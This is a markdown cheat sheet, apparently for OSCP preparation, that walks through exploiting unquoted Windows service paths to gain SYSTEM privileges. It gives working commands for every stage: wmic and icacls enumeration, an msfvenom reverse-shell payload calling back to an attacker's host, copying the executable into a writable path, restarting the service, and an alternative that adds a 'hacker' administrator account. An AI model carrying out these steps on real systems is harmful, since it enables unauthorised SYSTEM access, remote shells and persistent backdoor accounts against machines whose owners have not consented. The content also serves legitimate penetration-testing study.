# Windows Privilege Escalation – Unquoted Service Paths

## Purpose

This file provides a structured workflow for identifying and exploiting unquoted service paths for privilege escalation.

Core rules:
- Spaces in service paths without quotes create ambiguity
- Windows will try multiple path interpretations
- If any intermediate path is writable → escalation
- Very common and fast win in OSCP

---

## 0. Mental Model

Service path:

C:\Program Files\My App\service.exe

Without quotes:

Windows interprets as:

C:\Program.exe  
C:\Program Files\My.exe  
C:\Program Files\My App\service.exe  

If you can place a malicious executable in any earlier path:
→ it gets executed as SYSTEM

---

## 1. Find Unquoted Service Paths (CRITICAL FIRST STEP)

cmd:

wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"

Look for:
- paths with spaces
- no quotes

---

## 2. Confirm Vulnerable Path

Example:

C:\Program Files\My App\service.exe

(no quotes)

---

## 3. Identify Execution Order

Windows will try:

1. C:\Program.exe  
2. C:\Program Files\My.exe  
3. C:\Program Files\My App\service.exe  

---

## 4. Check Writable Locations (CRITICAL)

Check each path:

icacls "C:\"
icacls "C:\Program Files\"
icacls "C:\Program Files\My App\"

Look for:
- (F) Full control
- (M) Modify
- write access for Users / Everyone

---

## 5. Exploit: Place Malicious Executable

Choose earliest writable location.

Example:

If writable:

C:\Program Files\

Create:

C:\Program Files\My.exe

---

## 6. Generate Payload

msfvenom:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o My.exe

---

## 7. Place Payload

copy My.exe "C:\Program Files\My.exe"

---

## 8. Trigger Service Execution

sc stop <service>
sc start <service>

OR:

- reboot system
- wait for service start

---

## 9. Verify SYSTEM

whoami

Expected:

nt authority\system

---

## 10. Alternative Payload (AV Safe)

Use simple payload:

cmd.exe

OR:

net user hacker Password123! /add
net localgroup administrators hacker /add

---

## 11. Use PowerUp (Optional)

PowerUp.ps1:

Get-ServiceUnquoted

---

## 12. Common Failure Points

- path actually quoted
- directory not writable
- wrong executable name
- service not restarted
- AV deletes payload

---

## 13. If Stuck

- re-check quotes carefully
- verify writable directory
- test each possible path
- confirm execution order

---

## 14. Quick Exploit Pattern

1. find unquoted service path
2. identify path parsing order
3. find writable directory
4. create malicious executable
5. place in correct location
6. restart service
7. get SYSTEM shell

---

## 15. Mental Model

Unquoted path = ambiguity  
Writable directory = insertion point  
Service = execution  
Payload = SYSTEM  

---

## 16. Golden Rules

- Always check for spaces + no quotes
- Always test earliest path first
- Directory permissions matter more than file permissions
- Restart triggers execution
- Keep payload simple if AV present